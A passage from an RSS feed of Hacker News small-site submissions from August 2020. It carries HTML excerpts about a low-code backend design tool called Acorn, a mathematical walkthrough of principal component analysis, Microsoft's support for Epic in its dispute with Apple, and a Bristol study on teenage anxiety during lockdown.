                                <a href="https://www.magicsplat.com/blog/tags/tcl-8-7/">Tcl 8.7</a>
                            </li>
                            <li>
                                <a href="https://www.magicsplat.com/blog/tags/tutorial/">tutorial</a>
                            </li>
                            <li>
                                <a href="https://www.magicsplat.com/blog/tags/zip/">zip</a>
                            </li>
                        </ul>
                    </nav><!-- tags -->
                </section></div>]]>
            </description>
            <link>https://www.magicsplat.com/blog/tcl87-zipfs/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24257855</guid>
            <pubDate>Mon, 24 Aug 2020 05:54:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: A simple word list processing utility (sort, replace, dedupe,)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24257679">thread link</a>) | @aclarembeau
<br/>
August 23, 2020 | https://aclarembeau.github.io/text-utilities/ | <a href="https://web.archive.org/web/*/https://aclarembeau.github.io/text-utilities/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://aclarembeau.github.io/text-utilities/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24257679</guid>
            <pubDate>Mon, 24 Aug 2020 05:11:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Acorn – a back end design tool/low-code platform]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24257664">thread link</a>) | @virtualbluesky
<br/>
August 23, 2020 | https://wiki.squirreltechnologies.nz/Acorn:Jobhunt | <a href="https://web.archive.org/web/*/https://wiki.squirreltechnologies.nz/Acorn:Jobhunt">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="bodyContent"><div id="mw-content-text" lang="en" dir="ltr"><div><p>This page tells the story of a software design tool for engineers, business analysts, and domain experts, with 3 parts:
</p>
<ol><li>this wiki, where all designs live</li>
<li><a rel="nofollow" href="https://acorn.squirreltechnologies.nz/view/Acorn:Jobhunt">an app</a>, where designs can be explored and edited</li>
<li><a rel="nofollow" href="https://pypi.org/project/pyacorn/">a command-line tool</a>, where designs are transformed into code</li></ol>
<p>This project, acorn, is looking for a place to mature into the transformative tool I know it can be. Read on to learn more, and please reach out at <a rel="nofollow" href="https://wiki.squirreltechnologies.nz/cdn-cgi/l/email-protection#8be7e2eae6cbf8fafee2f9f9eee7ffeee8e3e5e4e7e4ece2eef8a5e5f1"><span data-cfemail="1e72777f735e6d6f6b776c6c7b726a7b7d767071727179777b6d307064">[email&nbsp;protected]</span></a> if you see a niche acorn could fill.
</p>


<h2><span id="Introduction">Introduction</span></h2>
<p>After a year or two of effort I've produced something I believe structurally improves both software development and the developed software. I am, however, neither salesman nor entrepreneur born and have already explored all the options I know for commercializing this work. As no crisis should ever go to waste, job hunting during one of the ...less ideal... times in recent history gives me an opportunity to demonstrate the nature of the tool I've produced. So without further ado, let me introduce acorn.
</p><p>In short, acorn is a design and documentation tool that generates functioning software systems. The central premise of this low-code platform is declarative specification of the language-agnostic elements of a back-end system. Domain-driven design is leveraged to create a common language shared by engineers, business analysts, and domain experts, while acorn avoids the trap of turning business analysts into programmers by ensuring any imperative programming is implemented using industry standard tooling. The core DNA of the tool is maturity by default without the associated lock-in of proprietary hosting or custom programming languages. This section of the wiki both explains and embodies the tool itself, so read on if I've captured your attention. Less detail can be found <a rel="nofollow" href="https://wiki.squirreltechnologies.nz/">here</a>.
</p>
<h3><span id="Background">Background</span></h3>
<p>Right off the bat - let's be clear. I didn't come up through software, though I have fond memories of making games on my graphics calculator in math class in school. Instead, my pedigree starts with mechanical engineering, a segue through biomedical engineering for a Ph.D, and finally analysis/data science to round out my little path-less-travelled. The common thread? Using my rudimentary mathematical skills to understand and influence the world around me. The fundamental issue at hand? You <b>need</b> software to make that happen.
</p><p>Either software systems produce the data you rely on, or software systems are required to implement the outcomes. Both, as it happens, is the more likely scenario, and I rapidly found myself frustrated with the state of the software world. When presented with a new and complex domain, I want to understand:
</p>
<ul><li>What data exists within the system, and what it means</li>
<li>How you can interact with that data</li>
<li>The pedigree of that data, and how it has evolved over time</li></ul>
<p>In practice, that means attempting to digest 15 years of messy development of an organically grown system. Reading code, spelunking outdated wikis, interpreting artistic architectural diagrams that boil down to a single individual's mental model, and generally hoping that the assumptions you make are safe enough for you to rely on your own analysis. The final straw was how fraught it was to actually evolve these bespoke organic systems.
</p><p>I tried to learn the professional lessons of the engineers around me that I respected, and so my journey towards acorn began.
</p>
<h2><span id="Key_concepts">Key concepts</span></h2>
<p>Before I continue on, there a few concepts that set the scene. First, acorn sees three important archetypes relevant to the development of software:
</p>
<ol><li>Experts: Knowledgeable about the domain, perhaps non-technical</li>
<li>Engineers: The ones who make it happen, perhaps despite not knowing what <i>it</i> is to begin with</li>
<li>E... Users: Anybody who relies on the resulting system, from non-technical users to external engineers</li></ol>
<p>You management types keep the world from descending into chaos&nbsp;:) but these three groups need to communicate clearly for the process to be successful. As good fences make good neighbours there are three levels of formality of data access required by these groups:
</p>
<ol><li>External: Highly formal contracts that have consequences when they change because external parties rely on them [Users, Experts, Engineers]</li>
<li>Internal: Formal, but manageable boundaries that different sections of your organization build upon [Experts, Engineers]</li>
<li>Private: Flexible boundaries enforced by a team on themselves purely for data consistency and ergonomic reasons [Engineers]</li></ol>
<p>Why do these two concepts matter? Because acorn is a tool that enables those three archetypes to collaborate, and to build software that requires no extra effort to maintain the different formality levels required for safe, productive development work. Keep these concepts in mind as a lens through which to understand the meta tool that follows.
</p>
<h2><span id="Terminology">Terminology</span></h2>
<p>My non-traditional route makes for non-traditional nomenclature, so this section should help explain what I mean by the terms I use for acorn's meta model of a software system.
</p>
<h3><span id="General_terms">General terms</span></h3>
<dl><dt>library</dt>
<dd>A software system that has been designed to be embedded in other systems, as opposed to run as a stand-alone entity</dd>
<dt>module</dt>
<dd>What you get when you wrap enough extra detail around a library such that it can be deployed</dd>
<dt>project</dt>
<dd>The design for a library/module along with its documentation and implementation</dd>
<dt>realm</dt>
<dd>Individual components within a project</dd></dl>
<p>Thus acorn is a tool that allows you create software projects while writing perhaps 20% of the normally required lines of back-end code. These projects are standardized to allow them to be embedded (for libraries) or connected (modules) in a modular fashion. This connection could be realized as either a microservice, monolithic, or function-as-a-service deployment model. These projects themselves consist of realms, where each realm is a bounded context in domain-driven design terminology, and could be individually owned by different teams if such scale is called for.
</p>
<h3><span id="Data-specific_terms">Data-specific terms</span></h3>
<dl><dt>primitive</dt>
<dd>The basic form of data within a system, everything from raw binary information to free text or dates</dd>
<dt>data type</dt>
<dd>An envelope of data containing perhaps many fields containing either primitives or other data types</dd>
<dt>event</dt>
<dd>A meaningful occurrence within the system, represented as a data type that is published under specific conditions</dd>
<dt>subscription</dt>
<dd>An asynchronous process that listens for specific events and allows a system to respond to changes</dd>
<dt>regular expression</dt>
<dd>a custom primitive with a specified pattern</dd>
<dt>lookup</dt>
<dd>a custom primitive that can take on a specific set of values that are defined at runtime</dd></dl>
<p>Thus acorn is a tool for creating data-intensive applications, where an application can be seen as a graph of primitive data fields described within data types. Editing this graph produces events at differing levels of granularity, which can be leveraged to perform meaningful responses to business-relevant changes. Oh, and realms containing data are effectively mutually exclusive sections of this graph.
</p>
<h3><span id="Domain-specific_terms">Domain-specific terms</span></h3>
<p>A domain is the foundational realm within a system. It contains data, and provides an <b>internal</b> boundary for manipulating that data. There are a number of specialized concepts within a domain, and the details of the internal boundary are intended to permit standardized, flexible data access where performant, and controlled access when potentially non-performant.
</p>
<dl><dt>Aggregate root</dt>
<dd>A data type that is persisted, has a defined lifecycle, and is queriable</dd>
<dt>Entity</dt>
<dd>A named sub-graph within an aggregate root that has additional lifecycle</dd>
<dt>Command</dt>
<dd>A mutation operation that has side-effects and produces an event</dd>
<dt>Query</dt>
<dd>A read-only aggregation or transformation of data within the domain</dd></dl>
<p>Thus projects created within acorn store data in domains, where command/query responsibility segregation is utilized to provide a set of meaningful interactions with this information. The underlying principle behind acorn is that the internal boundary formed by these domains is necessary and sufficient for rapid development, exploratory analysis, and eventual extension.
</p>
<h3><span id="Portal-specific_terms">Portal-specific terms</span></h3>
<p>A portal is a realm that forms an <b>external</b> boundary for the system. Analogous to an application service in domain-driven design, portals handle inter-domain co-ordination that goes beyond pure asynchronous event subscription. Portals contain a number of specialized concepts to create a intelligible view over the use-cases of a system.
</p>
<dl><dt>Context</dt>
<dd>An externally facing set of nodes on the formal boundary of the system that share a common definition and may be associated with other contexts</dd>
<dt>View</dt>
<dd>A simple query that may belong to a context</dd>
<dt>Action</dt>
<dd>A formal mutation operation, perhaps belonging to a context, that may return enough information to navigate to a new/existing context</dd>
<dt>Navigation</dt>
<dd>Information on how to reach different contexts from the data returned by a read operation</dd>
<dt>Component</dt>
<dd>An embeddable javascript widget that supports interactions too complex for a form-based interface</dd></dl>
<p>Thus portals, while stateless, contain all the information required to make the internal boundaries of a system both legible and safe to use for external users/downstream systems. The degenerate form of a portal is simply a layer over a domain that calls aggregate roots "contexts", commands "actions", and queries "views". In other words, a typical CRUD layer over a SQL database.
</p>
<h3><span id="Engine-specific_terms">Engine-specific terms</span></h3>
<p>Domains support asynchronous processing, and portals form the boundary that initiates this processing. An engine is a realm that can co-ordinate asynchronous processing and solicit user input when required. Engines contain a number of specialized concepts to define state machines for these processes and thus simplify development of the inevitable BPMN-style flow charting and saga creation.
</p>
<dl><dt>User input</dt>
<dd>A request for additional input, represented by an action in a portal if the request cannot be automatically fulfilled</dd>
<dt>Subprocess</dt>
<dd>A logical set of background processing, starting with a command and terminating in an event after perhaps many subscriptions</dd>
<dt>Process</dt>
<dd>A…</dd></dl></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://wiki.squirreltechnologies.nz/Acorn:Jobhunt">https://wiki.squirreltechnologies.nz/Acorn:Jobhunt</a></em></p>]]>
            </description>
            <link>https://wiki.squirreltechnologies.nz/Acorn:Jobhunt</link>
            <guid isPermaLink="false">hacker-news-small-sites-24257664</guid>
            <pubDate>Mon, 24 Aug 2020 05:08:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Principal Component Analysis]]>
            </title>
            <description>
<![CDATA[
Score 44 | Comments 5 (<a href="https://news.ycombinator.com/item?id=24257468">thread link</a>) | @keyboardman
<br/>
August 23, 2020 | https://leimao.github.io/article/Principal-Component-Analysis/ | <a href="https://web.archive.org/web/*/https://leimao.github.io/article/Principal-Component-Analysis/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <h3 id="introduction">Introduction</h3>

<p>Principal components analysis (PCA) is one of a family of techniques for taking high-dimensional data, and using the dependencies between the variables to represent it in a more tractable, lower-dimensional form, without losing too much information. It has been widely used for data compression and de-noising. However, its entire mathematical process is sometimes ambiguous to the user.</p>



<p>In this article, I would like to discuss the entire process of PCA mathematically, including PCA projection and reconstruction, with most of the derivations and proofs provided. At the end of the article, I implemented PCA projection and reconstruction from scratch. After reading this article, there should be no more black box in PCA anymore.</p>

<h3 id="prerequisites">Prerequisites</h3>

<h4 id="orthogonal-matrix">Orthogonal Matrix</h4>

<p>In linear algebra, an orthogonal matrix is a real square matrix whose columns and rows are orthogonal unit vectors (orthonormal vectors).</p>



<p>Equivalently, the mathematical expression is</p><p>

\[\begin{align}
A^{\top}A = AA^{\top} = I
\end{align}\]

</p><p>By <a href="https://en.wikipedia.org/wiki/Invertible_matrix">the definition of invertible matrix</a>, this means matrix $A$ is invertible and $A^{-1} = A^{\top}$.</p>



<p>We could also view this from the perspective of determinant.</p>



<p>Because $A$ and $A^{\top}$ are square matrices and using <a href="https://en.wikipedia.org/wiki/Determinant#Properties_of_the_determinant">the properties of determinant</a></p><p>

\[\begin{align}
\det(I) &amp;= \det(A^{\top}A) \\
&amp;= \det(AA^{\top}) \\
&amp;= \det(A) \det(A^{\top}) \\
&amp;= \det(A) \det(A) \\
&amp;= \det(A)^2 \\
&amp;= \det(A^{\top})^2 \\
&amp;= 1 \\
\end{align}\]

</p><p>Since $\det(A) \neq 0$, matrix $A$ is invertible. We multiply $A^{-1}$ on both side of the orthogonal matrix definition.</p><p>

\[\begin{align}
A^{\top}A A^{-1} &amp;= I A^{-1}\\
A^{\top} I &amp;= A^{-1} \\
A^{\top} &amp;= A^{-1} \\
\end{align}\]

</p><p>We have also derived the conclusion that $A^{-1} = A^{\top}$.</p>



<p>Similarly, a complex square matrix $A$ is unitary if its transpose conjugate $A^{\dagger}$ is also its inverse.</p>



<p>Equivalently, the mathematical expression is</p><p>

\[\begin{align}
A^{\dagger}A = AA^{\dagger} = I
\end{align}\]

</p><h4 id="symmetric-matrix">Symmetric Matrix</h4>

<p>Real symmetric matrix has the following useful properties:</p>



<p>If $A$ is a real symmetric matrix, all of its eigenvalues are real numbers.</p>



<p>Because of <a href="https://en.wikipedia.org/wiki/Complex_conjugate#Generalizations">the conjugate properties</a> and $\overline{A} = A$ since $A$ is a real value matrix,</p><p>

\[\begin{align}
\overline{Av} &amp;= \overline{\lambda v} \\
&amp;= \overline{A} \overline{v} \\
&amp;= A \overline{v} \\
&amp;= \overline{\lambda} \overline{v} \\
\end{align}\]

</p><p>We got $A \overline{v} = \overline{\lambda} \overline{v}$.</p>



<p>Let $\lambda \in \mathbb{C}$ be an eigenvalue of the symmetric matrix $A$. $Av = \lambda v$ and $v \neq 0$. We multiply $v^{\dagger}$ ($v^{\dagger} = \overline{v}^{\top}$) to the both sides, and because of $A^{\top} = A$ and the property we have just derived $A \overline{v} = \overline{\lambda} \overline{v}$,</p><p>

\[\begin{align}
v^{\dagger} A v &amp;= \lambda v^{\dagger} v \\
&amp;= v^{\dagger} A^{\top} v \\
&amp;= \overline{v}^{\top} A^{\top} v \\
&amp;= (A\overline{v})^{\top} v \\
&amp;= (\overline{\lambda} \overline{v})^{\top} v \\
&amp;= \overline{\lambda}^{\top} \overline{v}^{\top} v \\
&amp;= \overline{\lambda} v^{\dagger} v \\
\end{align}\]

</p><p>We have $\lambda v^{\dagger} v = \overline{\lambda} v^{\dagger} v$, thus $\lambda$ is real.</p>



<p>This concludes the proof.</p>

<h4 id="positive-semi-definite-matrix">Positive Semi-Definite Matrix</h4>

<p>The $n \times n$ symmetric matrix $A$ is defined to be positive semi-definite, if $x^{\dagger} A x \geq 0$ for $x \in \mathbb{C}^n$.</p>



<p>The positive semi-definite matrix has the following important property:</p>



<p>The eigenvalues of positive semi-definite matrix are non-negative.</p>



<p>Because $x^{\dagger} A x \geq$ for $x \in \mathbb{C}^n$, suppose $x$ is an eigenvector of $A$ and $Ax = \lambda x$ where $x \neq 0$,</p><p>

\[\begin{align}
x^{\dagger} A x &amp;= x^{\dagger} \lambda x \\
&amp;= \lambda x^{\dagger} x \\
&amp;\geq 0 \\
\end{align}\]

</p><p>Because $x^{\dagger} x$ must be real number and $x^{\dagger} x &gt; 0$, we have $\lambda \geq 0$.</p>



<p>This concludes the proof.</p>

<h4 id="covariance-matrix">Covariance Matrix</h4>

<p>The covariance matrix has the following important property:</p>



<p>Covariance matrix is positive semi-definite. This means that the eigenvalues of covariance matrix is non-negative.</p>



<p>The proof of that covariance must be positive semi-definite could be found in my previous post on <a href="https://leimao.github.io/blog/Multivariate-Gaussian-Covariance-Matrix/">Multivariate Gaussian and Covariance Matrix</a>.</p>

<h4 id="singular-values">Singular Values</h4>

<p>The singular values, $\sigma_1$, $\sigma_2$, $\cdots$, $\sigma_r$, of an $m \times n$ matrix $A$ are the square roots, $\sigma_i = \sqrt{\lambda_i}$, of non-negative eigenvalues of the associated Gram matrix $K = A^{\dagger}A$. The corresponding eigenvectors of $K$ are known as singular vectors of $A$.</p>



<p>Note that the associated Gram matrix $K = A^{\dagger}A$ is real and symmetric, so the eigenvalues of $K$ are all real.</p>



<p>$K = A^{\dagger}A$ is also positive semi-definite.</p>



<p>For any vector $x$</p><p>

\[x^{\dagger} (A^{\dagger} A) x = (Ax)^{\dagger} Ax\]

</p><p>Because $Ax$ is also a vector,</p><p>

\[\begin{align}
x^{\dagger} (A^{\dagger} A) x \geq 0
\end{align}\]

</p><p>Therefore, all the eigenvalues of $K = A^{\dagger}A$ are non-negative and they all have a corresponded singular value of $A$.</p>

<h4 id="singular-value-decomposition">Singular Value Decomposition</h4>

<p>In linear algebra, the singular value decomposition (SVD) is a factorization of a real or complex matrix that generalizes the eigendecomposition of a square normal matrix to any $ m\times n$ matrix via an extension of the polar decomposition.</p>



<p>Specifically, the singular value decomposition of an $m \times n$ real or complex matrix $M$ is a factorization of the form $U \Sigma V^{\dagger}$, where $U$ is an $m \times m$ real or complex unitary matrix, $\Sigma$ is a $m \times n$ rectangular diagonal matrix with non-negative real numbers on the diagonal, and $V$ is an $n \times n$ real or complex unitary matrix.</p>



<p>The diagonal entries $\sigma_{i}=\Sigma_{ii}$ of $\Sigma$ are known as the singular values of $M$. The number of non-zero singular values is equal to the rank of $M$.</p>



<p>In particular, for any matrix $A \in \mathbb{C}$,</p><p>

\[A_{m \times n} = U_{m\times m} \Sigma_{m \times n} V_{n \times n}^{\dagger}\]

</p><p>We will skip the proof for why every matrix has SVD and the algorithm for SVD.</p>

<h4 id="singular-value-decomposition-for-norm-matrix">Singular Value Decomposition for Norm Matrix</h4>

<p>For any matrix $A \in \mathbb{C}$, $A^{\dagger} A$ could be expressed as</p><p>

\[\begin{align}
A^{\dagger} A &amp;= (U \Sigma V^{\dagger})^{\dagger} U \Sigma V^{\dagger} \\
&amp;= V \Sigma^{\dagger} U^{\dagger}  U \Sigma V^{\dagger} \\
&amp;= V \Sigma^{\dagger} I \Sigma V^{\dagger} \\
&amp;= V \Sigma^{\dagger} \Sigma V^{\dagger}
\end{align}\]

</p><p>We multiply $V$ at both side of the equation.</p><p>

\[\begin{align}
A^{\dagger} A V &amp;= V \Sigma^{\dagger} \Sigma V^{\dagger} V \\
&amp;=  V \Sigma^{\dagger} \Sigma I \\
&amp;=  V \Sigma^{\dagger} \Sigma \\
&amp;= \Sigma^{\dagger} \Sigma V \\
\end{align}\]

</p><p>Note that $\Sigma^{\dagger} \Sigma$ is a square diagonal matrix. Based on the definition of eigenvalue and eigenvectors, the diagonal values of $\Sigma^{\dagger} \Sigma$, including the zeros, are the eigenvalues of $A^{\dagger} A$. All the columns of $V$ are the corresponding eigenvectors of $A^{\dagger} A$.</p>



<p>Similarly, $A A^{\dagger}$ could be expressed as</p><p>

\[\begin{align}
A A^{\dagger} U &amp;= \Sigma \Sigma^{\dagger} U \\
\end{align}\]

</p><p>Note that $\Sigma \Sigma^{\dagger}$ is a square diagonal matrix. Based on the definition of eigenvalue and eigenvectors, the diagonal values of $\Sigma \Sigma^{\dagger}$, including the zeros, are the eigenvalues of $A A^{\dagger}$. All the columns of $U$ are the corresponding eigenvectors of $A A^{\dagger}$.</p>

<h3 id="mathematics-of-principal-components-analysis">Mathematics of Principal Components Analysis</h3>

<p>We start with $p$-dimensional vectors, and want to summarize them by projecting down into a $q$-dimensional subspace, where $q \leq p$. Our summary will be the projection of the original vectors on to $q$ directions, the principal axes, which span the subspace.</p>

<h4 id="minimizing-projection-residuals">Minimizing Projection Residuals</h4>

<p>Given a dataset $X \in \mathbb{R}^{n \times p}$ whose row is the centered data vectors $x_i \in \mathbb{R}^p$ for $0 \leq i \leq n-1$ ($\sum_{i=0}^{n-1} x_{i} = 0$), if we have a unit vector $w \in \mathbb{R}^p$ ($|w| = 1$) and we project the all the data vectors to this unit vector $w$.</p>



<p>The length of projection for data vector $x_i$ on $w$, by definition, is</p><p>

\[\begin{align}
|x_i| \cos \theta &amp;= \frac{\langle x_i, w \rangle}{|w|} \\
&amp;= \langle x_i, w \rangle \\
\end{align}\]

</p><p>where $\langle x_i, w \rangle$ is the inner product of $x_i$ and $w$.</p>



<p>The projection vector for data vector $x_i$ on $w$ is $\langle x_i, w \rangle w$.</p>



<p>The residual, which is the distance from data vector $x_i$ to $w$, is the length of vector $x_i - \langle x_i, w \rangle w$.</p>



<p>Let’s check what the residual square $| x_i - \langle x_i, w \rangle w | ^2$ is.</p><p>

\[\begin{align}
| x_i - \langle x_i, w \rangle w |^2 &amp;= \langle x_i - \langle x_i, w \rangle w, x_i - \langle x_i, w \rangle w \rangle \\
&amp;= \langle x_i, x_i \rangle - \langle x_i, \langle x_i, w \rangle w \rangle - \langle \langle x_i, w \rangle w, x_i \rangle + \langle \langle x_i, w \rangle w, \langle x_i, w \rangle w \rangle \\
&amp;= \langle x_i, x_i \rangle - \langle x_i, w \rangle \langle x_i, w \rangle - \langle x_i, w \rangle \langle w, x_i \rangle + \langle x_i, w \rangle ^2 \langle w,  w \rangle \\
&amp;= \langle x_i, x_i \rangle - 2 \langle x_i, w \rangle ^2 + \langle x_i, w \rangle ^2 |w| ^2 \\
&amp;= \langle x_i, x_i \rangle - 2 \langle x_i, w \rangle ^2 + \langle x_i, w \rangle ^2 \\
&amp;= \langle x_i, x_i \rangle -  \langle x_i, w \rangle ^2 \\
\end{align}\]

</p><p>The optimization goal of projection is to minimize mean squared error $\text{MSE}(w)$, which is the mean of the residual sum of squares.</p><p>

\[\begin{align}
\text{MSE}(w) &amp;= \frac{1}{n} \sum_{i=0}^{n-1} | x_i - \langle x_i, w \rangle w |^2 \\
&amp;= \frac{1}{n} \sum_{i=0}^{n-1} \big( \langle x_i, x_i \rangle -  \langle x_i, w \rangle ^2 \big)\\
&amp;= \frac{1}{n} \sum_{i=0}^{n-1} \langle x_i, x_i \rangle - \frac{1}{n} \sum_{i=0}^{n-1}  \langle x_i, w \rangle ^2\\
\end{align}\]

</p><p>Remember the relationship between variance and expected value, $\mathbb{V}(X) = \mathbb{E}(X^2) - \mathbb{E}(X)^2$, …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://leimao.github.io/article/Principal-Component-Analysis/">https://leimao.github.io/article/Principal-Component-Analysis/</a></em></p>]]>
            </description>
            <link>https://leimao.github.io/article/Principal-Component-Analysis/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24257468</guid>
            <pubDate>Mon, 24 Aug 2020 04:12:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Microsoft supports Epic in conflict with Apple]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24257455">thread link</a>) | @GamerNintendo
<br/>
August 23, 2020 | https://nintendosmash.com/microsoft-supported-epic-in-conflict-with-apple-asking-not-to-delete-its-developer-accounts/ | <a href="https://web.archive.org/web/*/https://nintendosmash.com/microsoft-supported-epic-in-conflict-with-apple-asking-not-to-delete-its-developer-accounts/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="the-post">
			
			<p><img width="660" height="330" src="https://nintendosmash.com/wp-content/uploads/2020/08/microsoft-supports-epic-660x330.jpg" alt="Microsoft supported Epic in conflict with Apple, asking not to delete its developer accounts">		</p>
	
		


			<div>

							

						
<p>
		
	
	
		
	<span><i></i>4 days ago</span>	
	<span><i></i><a href="https://nintendosmash.com/category/news/" rel="category tag">News</a></span>
	
	
</p>

			
				<div>
					
					
					
<p>Microsoft’s statement was shared by the head of Xbox Phil Spencer. It’s not about Epic’s original requirements, but about requests from the creators of Unreal Engine to keep them accessing developer accounts on the Apple platform.</p>




<blockquote><p>We filed an application today in support of Epic Games’ request to keep its access to Apple’s Unreal Engine toolbox. Keeping Epic’s access to the latest Apple technology will be the right choice for developers and gamers.</p><p><br> Phil Spencer<br> head Xbox</p></blockquote>



<p>In its document, the company says that the Unreal Engine is a critical engine for many developers around the world, including Microsoft itself, many of whose games for Xbox and PC are created on it.</p>



<p>Microsoft also noted that while large studios can afford to develop their own game engines, smaller teams are much more profitable to use off-the-shelf technologies like the Unreal Engine.</p>



<blockquote><p>Many indie developers don’t have the resources or ability to write their own engine. They rely entirely on third-party technologies.</p><p><br>from Microsoft statement</p></blockquote>



<p>The Epic vs. Apple standoff began on August 13 over Fortnite. The game developers added their in-game currency payment system to the applications, bypassing Apple’s service fee, after which the second removed the online action from the mobile store. Epic has filed a lawsuit against Apple, believing that the company maintains a monopoly by cutting off any competition.</p>



<p>Once submitted Apple <a href="http://nintendosmash.com/apple-has-threatened-epic-games-with-deleting-its-app-store-accounts-this-will-prevent-all-ios-apps-running-on-unreal-engine/">lawsuit</a> said of Epic, which will remove it from your system developer account August 28, depriving them of their ability to support the applications on iOS and Mac and to produce new ones.</p>



<p>This may mean that the Unreal Engine, in principle, will no longer be supported by Apple systems, and games on this engine will not be able to be released on iOS. As Epic itself says, not only they will suffer, but also many other developers who work with its engine.</p>



<p>At the same time, Microsoft has its own conflict with Apple, since it previously refused to launch iCloud on iOS. Apple explained this by the fact that such services allow you to run applications that it has not tested.</p>



<p>As for the proceedings with Epic Games, Apple said that before the conflict began, Tim Sweeney tried to achieve special conditions for his company, also mentioning that he would like the same for other companies.</p>

 
















<!-- AI CONTENT END 3 -->
					
									</div><!-- .entry /-->
								
				
				 <!-- .share-post -->				
			</div><!-- .post-inner -->
		</article><section id="check-also-box">
		<a href="#" id="check-also-close"><i></i></a>

		<p>
			<h3>Check Also</h3>
		</p>

				<div>
						
			<p><a href="https://nintendosmash.com/nintendo-confirms-more-nintendo-direct-mini-partner-showcase-in-the-future/">
					<img width="310" height="165" src="https://nintendosmash.com/wp-content/uploads/2020/08/direct-mini-310x165.jpg" alt="Nintendo confirms more Nintendo Direct Mini: Partner Showcase in the future">					<span></span>
				</a>
			</p><!-- post-thumbnail /-->
						
			<h2><a href="https://nintendosmash.com/nintendo-confirms-more-nintendo-direct-mini-partner-showcase-in-the-future/" rel="bookmark">Nintendo confirms more Nintendo Direct Mini: Partner Showcase in the future</a></h2>
			<p>As you know, today the second Official Nintendo Direct Mini: Partner Showcase was shared. Well, …</p>
		</div>
				<div>
						
			<p><a href="https://nintendosmash.com/gotham-knights-is-by-no-means-a-service-game-action-details-from-wb-montreal/">
					<img width="310" height="165" src="https://nintendosmash.com/wp-content/uploads/2020/08/wb-310x165.jpg" alt="&quot;Gotham Knights is by no means a service game&quot;: action details from WB Montreal">					<span></span>
				</a>
			</p><!-- post-thumbnail /-->
						
			<h2><a href="https://nintendosmash.com/gotham-knights-is-by-no-means-a-service-game-action-details-from-wb-montreal/" rel="bookmark">“Gotham Knights is by no means a service game”: action details from WB Montreal</a></h2>
			<p>In an interview. the staff of WB Montreal, the creative director and lead producer of …</p>
		</div>
				<div>
						
			<p><a href="https://nintendosmash.com/playstation-5-certified-in-brazil-for-wi-fi-6-and-bluetooth-5-1/">
					<img width="310" height="165" src="https://nintendosmash.com/wp-content/uploads/2020/08/ps5-desing-310x165.jpg" alt="PlayStation 5 certified in Brazil for Wi-Fi 6 and Bluetooth 5.1">					<span></span>
				</a>
			</p><!-- post-thumbnail /-->
						
			<h2><a href="https://nintendosmash.com/playstation-5-certified-in-brazil-for-wi-fi-6-and-bluetooth-5-1/" rel="bookmark">PlayStation 5 certified in Brazil for Wi-Fi 6 and Bluetooth 5.1</a></h2>
			<p>Sony has filed documents for PS5 certification in Brazil – as, in other countries, the …</p>
		</div>
				
			</section></div>]]>
            </description>
            <link>https://nintendosmash.com/microsoft-supported-epic-in-conflict-with-apple-asking-not-to-delete-its-developer-accounts/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24257455</guid>
            <pubDate>Mon, 24 Aug 2020 04:08:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Teenage anxiety / Covid lockdown: Study in England leads to surprising findings]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24257147">thread link</a>) | @finphil
<br/>
August 23, 2020 | https://nuadox.com/post/627296328752447488/teenage-anxiety-covid-19-lockdown | <a href="https://web.archive.org/web/*/https://nuadox.com/post/627296328752447488/teenage-anxiety-covid-19-lockdown">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> 
                 
                    
                    <article id="627296328752447488">
                        <div>
                            <div>
                                <a href="https://nuadox.com/post/627296328752447488/teenage-anxiety-covid-19-lockdown"><h2>Teenage anxiety and COVID-19 lockdown: Study in England leads to surprising findings</h2></a>
                                <figure data-orig-width="1920" data-orig-height="1290"><img src="https://64.media.tumblr.com/1c1cbe0a1a784ad09b89332419f59225/040b6c77faef2d93-50/s1280x1920/0167f8dd392c23a80da441832950475d329b3202.jpg" alt="image" data-orig-width="1920" data-orig-height="1290" width="1280" height="860"></figure><p><b>- By <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.bristol.ac.uk%2F&amp;t=Nzc2MTBhYTE1OWFkMTkxNTdjNGU3Mzc2NGE1YmMwOTU1YjFjZWM3ZCwyb1RJU01saQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F627296328752447488%2Fteenage-anxiety-covid-19-lockdown&amp;m=0&amp;ts=1598559769">University of Bristol</a> -</b></p><p>Younger teenagers in the South West of England felt less anxious and more connected to school when they were away from it during the COVID-19 global pandemic public lockdown, a first-of-its-kind study has found.</p><p>The striking results of research led by the University of Bristol are published today by the National Institute for Health Research School for Public Health Research (NIHR SPHR) in a report which raises questions about the impact of the school environment on young people’s mental health and calls for more support to help them when they return to the classroom.</p><p>More than half (54 per cent) of the 13 to 14-year-old girls surveyed last October showed they were at risk of anxiety, compared to around a quarter (26 per cent) of boys of the same age. When surveyed again in May, during the pandemic which forced schools to shut and placed unprecedented restrictions on people’s lives, the figures dropped by nearly 10 per cent among girls to less than half (45 per cent) and to less than one in five of boys (18 per cent).</p><p>“With the whole world in the grip of a devastating pandemic, which has thrown everyone’s lives into turmoil, the natural expectation would be to see an increase in anxiety said lead author 